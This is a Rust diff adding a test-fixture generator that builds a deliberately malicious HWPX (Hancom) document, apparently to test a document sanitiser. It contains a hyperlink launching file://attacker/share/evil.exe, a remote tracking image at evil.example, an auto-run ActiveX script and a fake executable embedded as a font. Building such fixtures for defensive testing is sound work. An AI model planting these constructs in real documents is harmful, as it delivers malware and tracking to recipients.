@@ -402,3 +402,96 @@ pub fn malicious_pdf() -> Vec<u8> {
     out.extend_from_slice(b"\nHIDDEN-PAYLOAD-HIDDEN-PAYLOAD");
     out
 }
+
+// ------------------------------------------------------------------------- HWPX
+pub const HP: &str = "http://www.hancom.co.kr/hwpml/2011/paragraph";
+pub const HC: &str = "http://www.hancom.co.kr/hwpml/2011/core";
+pub const HS: &str = "http://www.hancom.co.kr/hwpml/2011/section";
+pub const HH: &str = "http://www.hancom.co.kr/hwpml/2011/head";
+pub const OPF: &str = "http://www.idpf.org/2007/opf/";
+
+pub fn malicious_hwpx() -> Vec<u8> {
+    let manifest = format!(
+        r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<opf:package xmlns:opf="{OPF}" xmlns:dc="http://purl.org/dc/elements/1.1/" version="" unique-identifier="" id="">
+  <opf:metadata><opf:title>공문</opf:title><opf:meta name="creator" content="text">홍길동</opf:meta></opf:metadata>
+  <opf:manifest>
+    <opf:item id="header" href="Contents/header.xml" media-type="application/xml"/>
+    <opf:item id="section0" href="Contents/section0.xml" media-type="application/xml"/>
+    <opf:item id="image1" href="BinData/image1.png" media-type="image/png" isEmbeded="1"/>
+    <opf:item id="ole1" href="BinData/ole1.ole" media-type="application/ole" isEmbeded="1"/>
+    <opf:item id="exe1" href="BinData/tool.bin" media-type="application/octet-stream" isEmbeded="1"/>
+    <opf:item id="remote" href="http://evil.example/track.png" media-type="image/png" isEmbeded="0"/>
+    <opf:item id="script" href="Scripts/sourceScripts" media-type="application/x-javascript"/>
+  </opf:manifest>
+  <opf:spine><opf:itemref idref="header" linear="yes"/><opf:itemref idref="section0" linear="yes"/></opf:spine>
+</opf:package>"#
+    );
+    let header = format!(
+        r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<hh:head xmlns:hh="{HH}" version="1.4" secCnt="1"><hh:refList><hh:fontfaces itemCnt="1"><hh:fontface lang="HANGUL" fontCnt="1"><hh:font id="0" face="함초롬바탕" type="TTF" isEmbedded="1" binaryItemIDRef="exe1"/></hh:fontface></hh:fontfaces></hh:refList></hh:head>"#
+    );
+    let section = format!(
+        r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<hs:sec xmlns:hs="{HS}" xmlns:hp="{HP}" xmlns:hc="{HC}" xmlns:evil="http://evil.example/ns">
+  <hp:p id="1"><hp:run charPrIDRef="0"><hp:t>안전한 본문 &amp; 기호</hp:t></hp:run></hp:p>
+  <hp:p id="2"><hp:run charPrIDRef="0">
+    <hp:ctrl><hp:fieldBegin id="10" type="HYPERLINK" name=""><hp:parameters cnt="2" name="">
+      <hp:stringParam name="Command">file\://attacker/share/evil.exe;1;0;0;</hp:stringParam>
+      <hp:stringParam name="Path">file://attacker/share/evil.exe</hp:stringParam>
+    </hp:parameters></hp:fieldBegin></hp:ctrl>
+    <hp:t>악성 링크</hp:t>
+    <hp:ctrl><hp:fieldEnd beginIDRef="10"/></hp:ctrl>
+  </hp:run></hp:p>
+  <hp:p id="3"><hp:run charPrIDRef="0">
+    <hp:ctrl><hp:fieldBegin id="11" type="HYPERLINK" name=""><hp:parameters cnt="1" name="">
+      <hp:stringParam name="Path">https://example.com/</hp:stringParam>
+    </hp:parameters></hp:fieldBegin></hp:ctrl>
+    <hp:t>정상 링크</hp:t>
+  </hp:run></hp:p>
+  <hp:p id="4"><hp:run charPrIDRef="0"><hp:pic id="20"><hc:img binaryItemIDRef="image1"/></hp:pic></hp:run></hp:p>
+  <hp:p id="5"><hp:run charPrIDRef="0"><hp:pic id="21"><hp:sz width="10"/><hc:img binaryItemIDRef="remote"/></hp:pic></hp:run></hp:p>
+  <hp:p id="6"><hp:run charPrIDRef="0"><hp:ole id="30" binaryItemIDRef="ole1"/></hp:run></hp:p>
+  <evil:payload>숨겨진 데이터</evil:payload>
+</hs:sec>"#
+    );
+    let container = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<ocf:container xmlns:ocf="urn:oasis:names:tc:opendocument:xmlns:container"><ocf:rootfiles>
+<ocf:rootfile full-path="Contents/content.hpf" media-type="application/hwpml-package+xml"/>
+<ocf:rootfile full-path="Scripts/sourceScripts" media-type="application/x-javascript"/>
+</ocf:rootfiles></ocf:container>"#;
+    let version = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><hv:HCFVersion xmlns:hv="http://www.hancom.co.kr/hwpml/2011/version" major="5" minor="1"/>"#;
+    let png = png_with_payload();
+    let mut w = zip::ZipWriter::new(Cursor::new(Vec::new()));
+    let stored =
+        zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);
+    w.start_file("mimetype", stored).unwrap();
+    w.write_all(b"application/hwp+zip").unwrap();
+    let opts = zip::write::SimpleFileOptions::default();
+    let files: Vec<(&str, &[u8])> = vec![
+        ("version.xml", version.as_bytes()),
+        ("META-INF/container.xml", container.as_bytes()),
+        ("Contents/content.hpf", manifest.as_bytes()),
+        ("Contents/header.xml", header.as_bytes()),
+        ("Contents/section0.xml", section.as_bytes()),
+        ("BinData/image1.png", &png),
+        (
+            "BinData/ole1.ole",
+            b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1payload",
+        ),
+        ("BinData/tool.bin", b"MZ\x90\x00 executable"),
+        (
+            "Scripts/sourceScripts",
+            "function OnDocument_New(){ new ActiveXObject('WScript.Shell').Run('calc'); }"
+                .as_bytes(),
+        ),
+        ("Scripts/headerScripts", b"var x;"),
+        ("Preview/PrvText.txt", "공문 미리보기\u{0007}".as_bytes()),
+        ("hidden/stash.bin", b"secret"),
+    ];
+    for (n, d) in files {
+        w.start_file(n, opts).unwrap();
+        w.write_all(d).unwrap();
+    }
+    w.finish().unwrap().into_inner()
+}
